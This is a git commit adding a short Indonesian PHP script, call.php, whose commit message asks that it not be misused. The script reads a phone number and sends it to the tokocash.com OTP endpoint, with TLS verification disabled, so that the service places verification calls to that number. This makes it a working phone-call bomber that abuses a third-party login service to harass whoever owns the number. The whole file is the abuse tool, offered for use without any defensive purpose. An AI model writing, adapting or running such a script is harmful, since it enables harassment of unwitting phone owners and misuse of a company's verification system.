dd935be34cb91aef2c6bc38705a92d77838896fb
fadilaja123 <54402210+fadilaja123@users.noreply.github.com>
2019-08-22 11:58:54 +0000

    readme.md
    Jangan disalahgunakan
    
    Didalam nya sudah jelas cara penggunaan nya

---
+++ call.php
@@ -0,0 +1,22 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "Created By 3X0RC1ST\n\n";
+echo "Masukan Nomor Dengan 62\n\n";
+echo "Contoh:62xxxxxxxxxxxx\n\n";
+
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
